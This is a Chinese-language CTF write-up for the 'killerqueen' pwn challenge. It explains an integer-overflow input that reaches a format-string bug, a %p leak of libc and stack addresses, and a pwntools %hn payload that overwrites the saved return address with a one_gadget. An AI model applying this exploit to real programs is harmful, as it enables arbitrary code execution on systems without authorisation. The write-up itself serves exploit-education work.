# killerqueen

## 题目简述

程序最终把用户输入直接作为格式化字符串使用。通过前置整数运算进入该路径后，可以用位置参数同时泄露 libc 指针和栈地址，再用 `%hn` 分两次改写栈上的保存返回地址，把它替换为 libc 中满足约束的 one_gadget。

## 解题过程

程序先给出整数 `weather`。官方脚本提交：

```python
choice = 2 * 2147483647 - weather
```

该值利用 32 位有符号整数的边界运算进入可控格式化字符串分支。随后以号码字段提交：

```text
%19$p-%38$p
```

在附件版本中，第 19 个参数泄露 `_IO_2_1_stdout_` 地址，第 38 个参数泄露栈上与保存返回地址相邻的位置。计算方式为：

```python
libc.address = leak_19 - libc.sym["_IO_2_1_stdout_"]
return_slot = leak_38 + 8
one_gadget = libc.address + 0x4F432
```

`+8` 是附件版本中泄露槽与保存返回地址槽的距离，应在本地调试中用栈布局确认。目标 one_gadget 要求 `[rsp+0x40] == NULL`。

返回地址原本已经指向 libc，故高位字节相同；只需把 one_gadget 的低 32 位分成两个 16 位数写入 `return_slot` 和 `return_slot+2`。概念上可让 pwntools 生成短写 payload：

```python
from pwn import *

writes = {
    return_slot: one_gadget & 0xFFFF,
    return_slot + 2: (one_gadget >> 16) & 0xFFFF,
}

payload = fmtstr_payload(
    offset=11,
    writes=writes,
    write_size="short",
)
send_message(payload)
send_message(b"e")  # 退出当前流程并触发被改写的返回地址
```

官方手写版本先用 `%11$hn` 写高半字，再用 `%12$hn` 写低半字，并在 payload 尾部依次放置 `return_slot+2`、`return_slot`。若后一个目标值小于已输出字符数，需要按 $2^{16}$ 取模增加宽度，否则 `%hn` 的计数会错误。

## 方法总结

格式化字符串利用通常由两步组成：先用 `%p` 确认参数索引并消除 ASLR，再用 `%n` 系列获得任意写。`%hn` 每次只写 2 字节，能显著减小填充长度，但必须按写入值排序并处理 16 位回绕。栈参数索引、泄露到返回槽的距离和 one_gadget 约束都依赖具体二进制与 libc，应逐项验证。
